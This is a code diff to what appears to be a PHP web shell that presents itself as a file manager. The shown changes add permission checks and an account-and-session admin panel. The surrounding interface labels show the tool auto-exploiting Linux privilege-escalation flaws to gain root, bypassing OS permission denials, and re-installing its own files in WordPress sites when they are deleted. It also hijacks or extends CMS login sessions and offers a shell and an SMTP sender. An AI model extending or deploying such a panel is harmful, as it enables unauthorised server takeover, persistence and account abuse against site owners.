+.mfa-hrow svg{width:14px;height:14px;flex-shrink:0;fill:none;stroke-width:2.1;stroke-linecap:round;stroke-linejoin:round}
+.mfa-hrow .n{color:var(--t1);font-weight:600}
+.mfa-hrow .sp{margin-left:auto;color:var(--t3);font-size:10.5px;text-align:right}
+.mfa-log{display:flex;flex-direction:column;gap:5px}
+.mfa-lrow{display:flex;gap:9px;align-items:baseline;padding:6px 9px;border-left:2px solid rgba(37,99,235,.4);background:var(--raised);border-radius:0 7px 7px 0;font-size:11.5px;color:var(--t2)}
+.mfa-lrow time{color:var(--t3);font-size:10.5px;white-space:nowrap}
+.mfa-lrow b{color:var(--t1)}
+.mfa-empty{padding:18px;text-align:center;color:var(--t3);font-size:11.5px;border:1px dashed var(--border);border-radius:9px}
+.mfa-msg{font-size:11px;margin:0 0 9px;min-height:14px}
+.mfa-msg.good{color:#86efac}.mfa-msg.bad{color:#fca5a5}
+@media(max-width:760px){
+  .mfa-mod{width:96vw;height:92vh}
+  .mfa-wrap{flex-direction:column}
+  .mfa-rail{width:auto;flex-direction:row;border-right:0;border-bottom:1px solid var(--border);overflow-x:auto;padding:7px}
+  .mfa-tab{width:auto;white-space:nowrap;padding:7px 10px}
+  .mfa-tab b{display:none}
+  .mfa-railfoot{display:none}
+  .mfa-drawer{width:100%}
+}
+/* <<MFMA-CSS-END>> */
 @keyframes fadeUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:none}}
 .mod-head{display:flex;align-items:center;gap:9px;padding:10px 14px;border-bottom:1px solid var(--border);background:var(--raised);flex-shrink:0}
 .mod-icon{width:24px;height:24px;border-radius:7px;display:flex;align-items:center;justify-content:center;background:rgba(133,137,140,.15);flex-shrink:0}
@@ -20200,10 +21085,15 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   <div class="sb-div"></div>
   <div class="sb-sec" style="flex-shrink:1;min-height:0;display:flex;flex-direction:column"><div class="sb-label">Tools</div>
     <div class="sb-nav" style="overflow-y:auto;overflow-x:hidden;min-height:0;flex:1">
-       <?php if(!empty($_SESSION['fm_admin'])):?>
+       <?php if(!empty($_SESSION['fm_admin'])&&fm_can('rooting')):?>
        <button class="sb-item" id="rootBtn" title="Every known Linux privilege-escalation vulnerability, whether this server is exposed to it, and the tool takes root by itself if any of them is open"><svg viewBox="0 0 24 24" style="stroke:#fca5a5"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 7.65-7.65"/><path d="m18 5 2 2"/><path d="m15 8 2 2"/></svg>Rooting<span id="rootBadge" style="margin-left:6px;font-size:10px;opacity:.85"></span></button>
        <?php endif;?>
-       <?php if(!empty($_SESSION['auth'])):?>
+       <?php if(function_exists('fm_mfm_is_primary')&&fm_mfm_is_primary()):?>
+       <button class="sb-item" id="mfaBtn" title="Every account of this file manager: what each one may do, which of their sessions are open, and everything an administrator can change about them">
+         <svg viewBox="0 0 24 24" style="stroke:#93c5fd"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><circle cx="9.5" cy="11" r="2"/><path d="M13.2 9.6a2.6 2.6 0 0 1 0 5.2"/><path d="M16 12h.01"/></svg>MFM Admin
+       </button>
+       <?php endif;?>
+       <?php if(!empty($_SESSION['auth'])&&fm_can('cms')):?>
        <button class="sb-item" id="cmsQuickBtn" title="Open the configured CMS administrator account">
          <svg viewBox="0 0 24 24" style="stroke:#2563eb"><path d="M12 20h9"/><path d="M16.5 3.5a2.12 2.12 0 0 1 3 3L8 18l-4 1 1-4Z"/><path d="m15 5 3 3"/></svg>CMS MFM ACC Login
        </button>
@@ -20213,7 +21103,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
          <svg viewBox="0 0 24 24"><path d="M4 4h16v16H4z"/><path d="M8 9h8M8 13h5"/><path d="M17 15v4M15 17h4"/></svg>Response Changer
        </button>
        <?php endif;?>
-       <?php if(!$fm->isRO()):?>
+       <?php if(!$fm->isRO()&&fm_can('terminal')):?>
        <button class="sb-item" id="termBtn"><svg viewBox="0 0 24 24"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>Terminal</button>
        <?php endif;?>
       <button class="sb-item" id="mfmSelectedSongsBtn" title="Play the Selected Songs repository playlist"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M9 18V5l12-2v13"/><circle cx="6" cy="18" r="3"/><circle cx="18" cy="16" r="3"/><path d="M3 6h3"/></svg>Selected Songs</button>
@@ -20247,11 +21137,15 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
       <?php endif;?>
       <button class="sb-item" id="cmsBtn"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>CMS Manager</button>
       <?php $pmNow=$fm->privMode();$pmShort=['server'=>'server','auto'=>'','wordpress'=>'WP','joomla'=>'Joomla'][$pmNow]??'';$pmLabel=['server'=>'Server account only','auto'=>'Automatic','wordpress'=>'WordPress','joomla'=>'Joomla'][$pmNow]??$pmNow;?>
-      <?php if(!empty($_SESSION['fm_admin'])):?>
+      <?php if(!empty($_SESSION['fm_admin'])&&fm_can('guard')):?>
       <button class="sb-item" id="sfgBtn" title="Files this tool installed in a site, backed up and put back if they are deleted (WordPress cron)"><svg viewBox="0 0 24 24"><path d="M12 2l9 4v6c0 5.5-3.8 9.5-9 10-5.2-.5-9-4.5-9-10V6l9-4z"/><path d="M9 12l2 2 4-4"/></svg>Site Files Guard<span id="sfgBadge" style="margin-left:6px;font-size:10px;opacity:.8"></span></button>
       <?php endif;?>
+      <?php if(fm_can('privmode')):?>
       <button class="sb-item" id="privModeBtn" title="File changes are performed by: <?=htmlspecialchars($pmLabel)?> — click to change"><svg viewBox="0 0 24 24"><path d="M4 21v-7"/><path d="M4 10V3"/><path d="M12 21v-9"/><path d="M12 8V3"/><path d="M20 21v-5"/><path d="M20 12V3"/><path d="M1 14h6"/><path d="M9 8h6"/><path d="M17 16h6"/></svg>Privilege Mode<span id="privModeBadge" style="margin-left:6px;font-size:10px;opacity:.8"><?=$pmShort===''?'':'· '.htmlspecialchars($pmShort)?></span></button>
+      <?php endif;?>
+      <?php if(fm_can('inspector')):?>
       <button class="sb-item" id="sessBtn" title="Inspect, extend or revoke real login sessions (WordPress / Joomla)"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="10" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/><path d="M12 15v2"/></svg>Session Inspector</button>
+      <?php endif;?>
       <button class="sb-item" id="cpanelBtn"><svg viewBox="0 0 24 24"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/><circle cx="12" cy="10" r="3"/></svg>cPanel Manager</button>
       <button class="sb-item" id="webmailBtn"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22 6 12 13 2 6"/></svg>Webmail Manager</button>
        <button class="sb-item" id="smtpSenderBtn"><svg viewBox="0 0 24 24"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22 6 12 13 2 6"/><path d="M16 17h.01"/></svg>SMTP Sender</button>
@@ -20294,7 +21188,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
       <div class="disk-lbl"><span>Disk</span><span><?=fmtSz($diskUsed)?> / <?=fmtSz($diskTotal)?></span></div>
       <div class="disk-tr"><div class="disk-fi <?=$diskPct>=90?'crit':($diskPct>=75?'warn':'')?>" style="width:<?=$diskPct?>%"></div></div>
     </div>
-    <?php if(!$fm->isRO()):?>
+    <?php if(!$fm->isRO()&&fm_can('bypass')):?>
         <button class="sb-item danger" id="bpBtn" title="A permission change the operating system refused — try every identity and every method this host has">
       <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/><path d="M12 16v3"/></svg>Bypass Permissions
     </button>
@@ -22157,12 +23051,131 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
 </div>
 <?php endif;?>
 
+<!-- ══ MFM ADMIN — the accounts of this file manager ══════════════════════════
+     Opened by the primary administrator account only. Nothing in here is
+     rendered for the accounts it creates: the button and the window are
+     written by the server-side check, not hidden afterwards. -->
+<?php if(function_exists('fm_mfm_is_primary')&&fm_mfm_is_primary()):?>
+<div class="mod-ov" id="mfmOv">
+  <div class="mod mfa-mod">
+    <div class="mod-head">
+      <div class="mod-icon"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><circle cx="9.5" cy="11" r="2"/><path d="M13.2 9.6a2.6 2.6 0 0 1 0 5.2"/><path d="M16 12h.01"/></svg></div>
+      <span class="mod-title">MFM Admin</span>
+      <button type="button" class="btn btn-icon btn-g" id="mfaClose" title="Close"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+    </div>
+    <div class="mfa-wrap">
+      <nav class="mfa-rail" id="mfaRail" aria-label="MFM Admin sections">
+        <button type="button" class="mfa-tab is-on" data-tab="overview" aria-current="page">
+          <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/></svg>
+          <span>Overview</span></button>
+        <button type="button" class="mfa-tab" data-tab="accounts">
+          <svg viewBox="0 0 24 24"><circle cx="9" cy="7" r="3.4"/><path d="M2.5 20v-1.6a4 4 0 0 1 4-4h5a4 4 0 0 1 4 4V20"/><path d="M17 8.2a3 3 0 0 1 0 5.6"/><path d="M19.5 20v-1.6a4 4 0 0 0-2-3.4"/></svg>
+          <span>Accounts</span><b id="mfaNAcc">0</b></button>
+        <button type="button" class="mfa-tab" data-tab="perms">
+          <svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M3 9h18M9 9v11"/><path d="m13 13 1.6 1.6L18 11"/></svg>
+          <span>Permissions</span></button>
+        <button type="button" class="mfa-tab" data-tab="sessions">
+          <svg viewBox="0 0 24 24"><rect x="2.5" y="4" width="19" height="13" rx="2"/><path d="M8 21h8"/><path d="M12 17v4"/><circle cx="12" cy="10.5" r="2.4"/></svg>
+          <span>Sessions</span><b id="mfaNSess">0</b></button>
+        <button type="button" class="mfa-tab" data-tab="activity">
+          <svg viewBox="0 0 24 24"><path d="M4 4h16v16H4z"/><path d="M8 9h8M8 13h8M8 17h4"/></svg>
+          <span>Activity</span></button>
+        <div class="mfa-railfoot" id="mfaMe">Signed in as —</div>
+      </nav>
+      <div class="mfa-panes" id="mfaPanes">
+        <section class="mfa-pane is-on" data-pane="overview" id="mfaPaneOverview">
+          <div class="mfa-cards" id="mfaCards"></div>
+          <div class="mfa-sec">
+            <div class="h">Health of this panel<span class="r" id="mfaHealthNote"></span></div>
+            <div class="mfa-health" id="mfaHealth"></div>
+          </div>
+          <div class="mfa-sec">
+            <div class="h">Quick actions</div>
+            <div class="mfa-tools">
+              <button type="button" class="mfa-mini p" id="mfaGoAccounts">Open accounts</button>
+              <button type="button" class="mfa-mini" id="mfaGoSessions">Open sessions</button>
+              <button type="button" class="mfa-mini" id="mfaEndOthers">Sign out every other session</button>
+              <button type="button" class="mfa-mini" id="mfaSelfCheck">Run the panel check</button>
+            </div>
+            <div class="mfa-msg" id="mfaQuickMsg"></div>
+            <div class="mfa-note">A permission change is saved in the account file and read on the next request of that account, so it reaches sessions that are already open: nothing has to be signed out first.</div>
+          </div>
+        </section>
+
+        <section class="mfa-pane" data-pane="accounts" id="mfaPaneAccounts">
+          <div class="mfa-tools">
+            <input type="search" class="mfa-in" id="mfaAccSearch" placeholder="Search an account, a permission or a state" style="flex:1;min-width:180px">
+            <button type="button" class="mfa-mini p" id="mfaAccNew">New account</button>
+          </div>
+          <div class="mfa-msg" id="mfaAccMsg"></div>
+          <table class="mfa-tbl">
+            <thead><tr><th>Account</th><th>Role</th><th>Permissions</th><th>Sessions</th><th>Last seen</th><th></th></tr></thead>
+            <tbody id="mfaAccBody"></tbody>
+          </table>
+          <div class="mfa-empty" id="mfaAccEmpty" style="display:none">No account matches that search.</div>
+
+          <aside class="mfa-drawer" id="mfaDrawer" aria-hidden="true">
+            <div class="dh">
+              <span class="mfa-ava" id="mfaDrawerAva">?</span>
+              <span class="t" id="mfaDrawerTitle">New account</span>
+              <button type="button" class="btn btn-icon btn-g" id="mfaDrawerClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button>
+            </div>
+            <div class="db" id="mfaDrawerBody"></div>
+            <div class="df">
+              <span class="mfa-msg" id="mfaDrawerMsg" style="flex:1;margin:0"></span>
+              <button type="button" class="mfa-mini" id="mfaDrawerCancel">Cancel</button>
+              <button type="button" class="mfa-mini p" id="mfaDrawerSave">Save</button>
+            </div>
+          </aside>
+        </section>
+
+        <section class="mfa-pane" data-pane="perms" id="mfaPanePerms">
+          <div class="mfa-tools">
+            <span class="mfa-note" style="flex:1">Tick a box to grant it at once. Every account except the primary administrator can be changed here.</span>
+            <button type="button" class="mfa-mini" id="mfaPermsReload">Reload</button>
+          </div>
+          <div class="mfa-msg" id="mfaPermsMsg"></div>
+          <div style="overflow:auto"><table class="mfa-tbl" id="mfaPermsTable"></table></div>
+        </section>
+
+        <section class="mfa-pane" data-pane="sessions" id="mfaPaneSessions">
+          <div class="mfa-tools">
+            <span class="mfa-note" style="flex:1">Every open session of this file manager. Ending one deletes its session on the server; extending one widens its idle window without a sign-out.</span>
+            <button type="button" class="mfa-mini" id="mfaSessReload">Reload</button>
+            <button type="button" class="mfa-mini d" id="mfaSessEndOthers">Sign out all others</button>
+          </div>
+          <div class="mfa-msg" id="mfaSessMsg"></div>
+          <table class="mfa-tbl">
+            <thead><tr><th>Account</th><th>Address</th><th>Signed in</th><th>Last seen</th><th>Idle window</th><th>State</th><th></th></tr></thead>
+            <tbody id="mfaSessBody"></tbody>
+          </table>
+          <div class="mfa-empty" id="mfaSessEmpty" style="display:none">No session is open right now.</div>
+        </section>
+
+        <section class="mfa-pane" data-pane="activity" id="mfaPaneActivity">
+          <div class="mfa-tools">
+            <span class="mfa-note" style="flex:1">Everything done from this window, newest first. It is a file next to the manager, readable by the server account only.</span>
+            <button type="button" class="mfa-mini" id="mfaLogReload">Reload</button>
+          </div>
+          <div class="mfa-log" id="mfaLog"></div>
+        </section>
+      </div>
+    </div>
+  </div>
+</div>
+<?php endif;?>
+
 <!-- USERS MODAL -->
 <?php if(!empty($_SESSION['fm_admin'])):?>
 <div class="mod-ov" id="usersOv">
   <div class="mod mod-sm">
     <div class="mod-head"><div class="mod-icon"><svg viewBox="0 0 24 24"><circle cx="9" cy="7" r="4"/><path d="M2 21v-2a4 4 0 0 1 4-4h6a4 4 0 0 1 4 4v2"/></svg></div><span class="mod-title">Manage Users</span><button class="btn btn-icon btn-g" id="usersClose"><svg viewBox="0 0 24 24"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></button></div>
     <div class="mod-body">
+      <?php if(function_exists('fm_mfm_is_primary')&&fm_mfm_is_primary()):?>
+      <button type="button" class="btn btn-g" id="usersOpenMfa" style="width:100%;margin-bottom:10px;justify-content:center">
+        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><circle cx="9.5" cy="11" r="2"/><path d="M13.2 9.6a2.6 2.6 0 0 1 0 5.2"/></svg>Open MFM Admin
+      </button>
+      <?php endif;?>
       <?php foreach(fm_load_users($usersFile) as $u):?>
       <div style="display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)">
         <div style="font-size:13px;color:#e4e4e7"><strong><?=htmlspecialchars($u['user'])?></strong><?php if(!empty($u['admin'])):?><span style="color:#85898C;font-size:11px"> · admin</span><?php endif;?><?php if(!empty($u['readonly'])):?><span style="color:#f59e0b;font-size:11px"> · ro</span><?php endif;?><div style="color:#71717a;font-size:11px;margin-top:1px"><?=htmlspecialchars($u['root']?:'Full access')?> · quota: <?=htmlspecialchars(fm_fmt_quota(fm_user_quota_bytes($u)))?></div></div>
@@ -27871,6 +28884,474 @@ document.getElementById('rootUnharden')?.addEventListener('click',async()=>{
   rootSet('rootMitOut',r.message||r.error||'',r.ok?'good':'bad');
   if(r.ok)rootLoad();
 });
+
+/* <<MFMJS-BEGIN>> */
+/* ══ MFM Admin ══════════════════════════════════════════════════════════════
+   The window itself: accounts, permissions, sessions and the audit trail.
+   Everything is drawn from one state object that the server sends, so the
+   numbers in the window are the numbers in the account file. */
+var MFA=null;                 /* the last state from the server */
+var MFA_TAB='overview';
+var MFA_DRAFT=null;           /* the account being edited in the drawer */
+function mfaEsc(v){return (typeof sessEsc==='function')?sessEsc(v):String(v==null?'':v);}
+function mfaHas(id){return document.getElementById(id);}
+function mfaAgo(ts){
+  if(!ts)return 'never';
+  var d=Math.max(0,Math.floor(Date.now()/1000)-ts);
+  if(d<60)return d+'s ago';
+  if(d<3600)return Math.floor(d/60)+'m ago';
+  if(d<86400)return Math.floor(d/3600)+'h ago';
+  return Math.floor(d/86400)+'d ago';
+}
+function mfaClock(ts){
+  if(!ts)return '—';
+  var d=new Date(ts*1000);
+  var p=function(n){return (n<10?'0':'')+n;};
+  return d.getFullYear()+'-'+p(d.getMonth()+1)+'-'+p(d.getDate())+' '+p(d.getHours())+':'+p(d.getMinutes());
+}
+function mfaDur(sec){
+  sec=Math.max(0,sec|0);
+  if(sec>=86400&&sec%86400===0)return (sec/86400)+' day(s)';
+  if(sec>=3600){var h=Math.round(sec/360)*10/10;return h+' hour(s)';}
+  return Math.round(sec/60)+' minute(s)';
+}
+function mfaSay(id,msg,kind){
+  var o=mfaHas(id);if(!o)return;
+  o.textContent=msg||'';
+  o.className='mfa-msg'+(kind?' '+kind:'');o.style.color=kind==='bad'?'#fca5a5':(kind==='good'?'#86efac':'');
+}
+async function mfaCall(action,extra){
+  var fd=new FormData();fd.append('csrf_token',typeof CSRF!=='undefined'?CSRF:'');fd.append('action',action);
+  for(var k in (extra||{})){if(extra[k]!==undefined&&extra[k]!==null)fd.append(k,String(extra[k]));}
+  try{
+    var r=await fetch('?x=mfmadmin',{method:'POST',body:fd,cache:'no-store',credentials:'same-origin'});
+    if(r.status===403){if(typeof toast==='function')toast('This window belongs to the primary administrator account.');return null;}
+    return await r.json();
+  }catch(e){if(typeof toast==='function')toast('The request failed.');return null;}
+}
+async function mfaLoad(){
+  var d=await mfaCall('state');
+  if(!d||!d.ok){if(typeof toast==='function')toast((d&&d.error)||'The accounts could not be read.');return;}
+  MFA=d;mfaRender();
+}
+function mfaTab(t){
+  MFA_TAB=t;
+  var rail=mfaHas('mfaRail');
+  if(rail)Array.prototype.forEach.call(rail.querySelectorAll('.mfa-tab'),function(b){
+    var on=b.getAttribute('data-tab')===t;
+    b.classList.toggle('is-on',on);
+    if(on)b.setAttribute('aria-current','page');else b.removeAttribute('aria-current');
+  });
+  var panes=mfaHas('mfaPanes');
+  if(panes)Array.prototype.forEach.call(panes.querySelectorAll('.mfa-pane'),function(p){
+    p.classList.toggle('is-on',p.getAttribute('data-pane')===t);
+  });
+  if(t!=='accounts')mfaDrawer(false);
+}
+function mfaPermShort(id){
+  var map={write:'Write',upload:'Upload',delete:'Delete',chmod:'chmod',chown:'chown',share:'Share',cms:'CMS',
+           inspector:'Sessions',privmode:'Privilege',owners:'Owner',guard:'Guard',terminal:'Shell',rooting:'Rooting',bypass:'Bypass'};
+  return map[id]||id;
+}
+function mfaRole(u){
+  if(u.admin)return 'Administrator';
+  if(!u.perms||!u.perms.length)return 'Read-only';
+  if(u.perms.length>=10)return 'Full access';
+  return 'Custom';
+}
+function mfaRender(){
+  if(!MFA)return;
+  var t=MFA.totals||{},u=MFA.users||[];
+  var rail=mfaHas('mfaRail');
+  if(rail){
+    var nAcc=mfaHas('mfaNAcc'),nSess=mfaHas('mfaNSess');
+    if(nAcc)nAcc.textContent=u.length;
+    if(nSess)nSess.textContent=(t.active||0)+(t.idle||0);
+  }
+  var me=mfaHas('mfaMe');
+  if(me)me.innerHTML='Signed in as <b>'+mfaEsc(MFA.me)+'</b><br>primary administrator';
+  mfaRenderOverview();mfaRenderAccounts();mfaRenderPerms();mfaRenderSessions();mfaRenderActivity();
+}
+function mfaRenderOverview(){
+  if(!MFA)return;
+  var t=MFA.totals||{},box=mfaHas('mfaCards');
+  if(box){
+    var card=function(k,v,s){return '<div class="mfa-card"><div class="k">'+k+'</div><div class="v">'+v+'</div><div class="s">'+s+'</div></div>';};
+    box.innerHTML=
+      card('Accounts',t.users||0,(t.admins||0)+' administrator(s)')+
+      card('Read-only',t.readonly||0,'no permission at all')+
+      card('Locked',t.locked||0,'cannot sign in')+
+      card('Active sessions',t.active||0,'seen in the last 5 minutes')+
+      card('Idle sessions',t.idle||0,'open, but not seen lately')+
+      card('Ended or expired',(t.ended||0)+(t.expired||0),'worth nothing now');
+  }
+  var h=mfaHas('mfaHealth'),srv=(MFA.server||{});
+  if(h){
+    var row=function(ok,name,note){
+      var svg=ok
+        ?'<svg viewBox="0 0 24 24" style="stroke:#86efac"><path d="M12 3 20 6v6c0 5-3.4 8.6-8 9.5C7.4 20.6 4 17 4 12V6z"/><path d="m8.6 12.2 2.4 2.3 4.4-4.5"/></svg>'
+        :'<svg viewBox="0 0 24 24" style="stroke:#fca5a5"><circle cx="12" cy="12" r="9"/><path d="M12 8v5M12 16h.01"/></svg>';
+      return '<div class="mfa-hrow">'+svg+'<span class="n">'+mfaEsc(name)+'</span><span class="sp">'+mfaEsc(note)+'</span></div>';
+    };
+    var primary=MFA.primary||'';
+    h.innerHTML=
+      row(!!primary,'Primary administrator',primary||'none')+
+      row((MFA.totals.users||0)>0,'Accounts in the file',(srv.users_size||0)+' bytes, mode '+mfaEsc(srv.users_mode||'?'))+
+      row(true,'Idle window','900 s, or more where extended')+
+      row(true,'Session store',srv.session_dir||'?')+
+      row(!!(t_active()),'Session registry',srv.registry||'?');
+    function t_active(){return (MFA.totals.active||0)+(MFA.totals.idle||0);}
+  }
+  var note=mfaHas('mfaHealthNote');
+  if(note)note.textContent='PHP '+mfaEsc(srv.php||'?');
+}
+function mfaFiltered(){
+  var q=(mfaHas('mfaAccSearch')&&mfaHas('mfaAccSearch').value||'').trim().toLowerCase();
+  var list=(MFA&&MFA.users)||[];
+  if(!q)return list;
+  return list.filter(function(u){
+    var hay=(u.user+' '+mfaRole(u)+' '+(u.perms||[]).join(' ')+(u.locked?' locked':'')+(u.admin?' admin':'')).toLowerCase();
+    return hay.indexOf(q)>=0;
+  });
+}
+function mfaRenderAccounts(){
+  if(!MFA)return;
+  var body=mfaHas('mfaAccBody');if(!body)return;
+  var list=mfaFiltered();
+  var empty=mfaHas('mfaAccEmpty');if(empty)empty.style.display=list.length?'none':'block';
+  body.innerHTML=list.map(function(u){
+    var chips='';
+    if(u.primary)chips+='<span class="mfa-chip adm">primary</span>';
+    else if(u.admin)chips+='<span class="mfa-chip adm">administrator</span>';
+    if(u.locked)chips+='<span class="mfa-chip lock">locked</span>';
+    if(u.me)chips+='<span class="mfa-chip on">you</span>';
+    var sess=u.sessions||{};
+    var sessTxt=(sess.active||0)?('<span class="mfa-dot a"></span>'+(sess.active)+' active')
+      :((sess.idle||0)?('<span class="mfa-dot i"></span>'+(sess.idle)+' idle')
+      :('<span class="mfa-dot e"></span>none'));
+    var perms=(u.perms||[]);
+    var pchips=perms.length?perms.slice(0,4).map(function(p){return '<span class="mfa-chip">'+mfaEsc(mfaPermShort(p))+'</span>';}).join('')
+      +(perms.length>4?'<span class="mfa-chip off">+'+(perms.length-4)+'</span>':'')
+      :'<span class="mfa-chip ro">no permission</span>';
+    return '<tr>'
+      +'<td><span class="mfa-name"><span class="mfa-ava'+(u.admin?'':' g')+'">'+mfaEsc((u.user||'?').slice(0,2))+'</span>'
+      +mfaEsc(u.user)+'</span><div style="margin-top:3px">'+chips+'</div></td>'
+      +'<td>'+mfaEsc(mfaRole(u))+'</td>'
+      +'<td>'+pchips+'</td>'
+      +'<td>'+sessTxt+'</td>'
+      +'<td>'+mfaEsc(mfaAgo(u.last_seen))+(u.last_ip?'<div class="mfa-note">'+mfaEsc(u.last_ip)+'</div>':'')+'</td>'
+      +'<td><div class="mfa-row-acts">'
+        +'<button type="button" class="mfa-mini p" data-act="edit" data-user="'+mfaEsc(u.user)+'">Edit</button>'
+        +'<button type="button" class="mfa-mini" data-act="pass" data-user="'+mfaEsc(u.user)+'">Password</button>'
+        +((sess.active||sess.idle)?'<button type="button" class="mfa-mini" data-act="endsess" data-user="'+mfaEsc(u.user)+'">Sign out</button>':'')
+        +(u.primary?'':'<button type="button" class="mfa-mini d" data-act="del" data-user="'+mfaEsc(u.user)+'">Delete</button>')
+      +'</div></td></tr>';
+  }).join('');
+}
+function mfaRenderPerms(){
+  if(!MFA)return;
+  var table=mfaHas('mfaPermsTable');if(!table)return;
+  var ids=[];var names={};
+  (MFA.catalog||[]).forEach(function(g){(g.items||[]).forEach(function(i){ids.push(i.id);names[i.id]=i.name;});});
+  var head='<thead><tr><th>Account</th>'+ids.map(function(id){
+    return '<th title="'+mfaEsc(names[id]||id)+'" style="text-align:center">'+mfaEsc(mfaPermShort(id))+'</th>';
+  }).join('')+'<th></th></tr></thead>';
+  var rows=(MFA.users||[]).map(function(u){
+    var cells=ids.map(function(id){
+      var on=(u.perms||[]).indexOf(id)>=0;
+      var dis=u.primary?' disabled':'';
+      return '<td style="text-align:center"><input type="checkbox" data-pmatrix="1" data-user="'+mfaEsc(u.user)+'" data-perm="'+id+'"'
+        +(on?' checked':'')+dis+' aria-label="'+mfaEsc(u.user+' may '+names[id])+'"></td>';
+    }).join('');
+    return '<tr><td><span class="mfa-name">'+mfaEsc(u.user)+'</span>'+(u.primary?'<div><span class="mfa-chip adm">primary</span></div>':'')+'</td>'
+      +cells+'<td><div class="mfa-row-acts"><button type="button" class="mfa-mini" data-act="edit" data-user="'+mfaEsc(u.user)+'">Open</button></div></td></tr>';
+  }).join('');
+  table.innerHTML=head+'<tbody>'+rows+'</tbody>';
+}
+function mfaRenderSessions(){
+  if(!MFA)return;
+  var body=mfaHas('mfaSessBody');if(!body)return;
+  var list=MFA.sessions||[];
+  var empty=mfaHas('mfaSessEmpty');if(empty)empty.style.display=list.length?'none':'block';
+  var label={active:'active',idle:'idle',expired:'expired',ended:'ended'};
+  body.innerHTML=list.map(function(s){
+    var acts='';
+    if(s.current){acts='<span class="mfa-chip on">this session</span>';}
+    else{
+      acts='<button type="button" class="mfa-mini" data-act="sess15" data-sid="'+mfaEsc(s.id)+'">+15m</button>'
+        +'<button type="button" class="mfa-mini" data-act="sess60" data-sid="'+mfaEsc(s.id)+'">+1h</button>'
+        +'<button type="button" class="mfa-mini" data-act="sess1440" data-sid="'+mfaEsc(s.id)+'">+1d</button>'
+        +'<button type="button" class="mfa-mini d" data-act="sessend" data-sid="'+mfaEsc(s.id)+'">End</button>';
+    }
+    var dot={active:'a',idle:'i',expired:'e',ended:'x'}[s.state]||'e';
+    return '<tr><td><span class="mfa-name">'+mfaEsc(s.user)+'</span></td>'
+      +'<td>'+mfaEsc(s.ip||'—')+(s.ua?'<div class="mfa-note" title="'+mfaEsc(s.ua)+'">'+mfaEsc(s.ua.slice(0,34))+(s.ua.length>34?'…':'')+'</div>':'')+'</td>'
+      +'<td>'+mfaEsc(mfaClock(s.login))+'</td>'
+      +'<td>'+mfaEsc(mfaAgo(s.seen))+'</td>'
+      +'<td>'+mfaEsc(mfaDur(s.limit||900))+'</td>'
+      +'<td><span class="mfa-dot '+dot+'"></span>'+mfaEsc(label[s.state]||s.state)+(s.ended_by?'<div class="mfa-note">by '+mfaEsc(s.ended_by)+'</div>':'')+'</td>'
+      +'<td><div class="mfa-row-acts">'+acts+'</div></td></tr>';
+  }).join('');
+}
+function mfaRenderActivity(){
+  if(!MFA)return;
+  var box=mfaHas('mfaLog');if(!box)return;
+  var list=MFA.activity||[];
+  if(!list.length){box.innerHTML='<div class="mfa-empty">Nothing has been changed from this window yet.</div>';return;}
+  box.innerHTML=list.map(function(r){
+    return '<div class="mfa-lrow"><time>'+mfaEsc(mfaClock(r.at))+'</time><span><b>'+mfaEsc(r.what)+'</b> — '+mfaEsc(r.detail||'')+'</span></div>';
+  }).join('');
+}
+/* ── the account drawer ─────────────────────────────────────────────────── */
+function mfaDrawer(open){
+  var d=mfaHas('mfaDrawer');if(!d)return;
+  d.classList.toggle('open',!!open);
+  d.setAttribute('aria-hidden',open?'false':'true');
+}
+function mfaOpenEditor(name){
+  if(!MFA)return;
+  var u=null,isNew=!name;
+  if(!isNew)(MFA.users||[]).forEach(function(x){if(x.user===name)u=x;});
+  if(!isNew&&!u){toast('That account is gone.');return;}
+  MFA_DRAFT=isNew
+    ?{user:'',perms:['write','upload','delete','chmod','share','cms'],admin:false,locked:false,root:'',quota:0,isNew:true}
+    :{user:u.user,perms:(u.perms||[]).slice(),admin:!!u.admin,locked:!!u.locked,root:u.root||'',quota:u.quota||0,isNew:false,
+      primary:!!u.primary,me:!!u.me,sessions:u.sessions||{}};
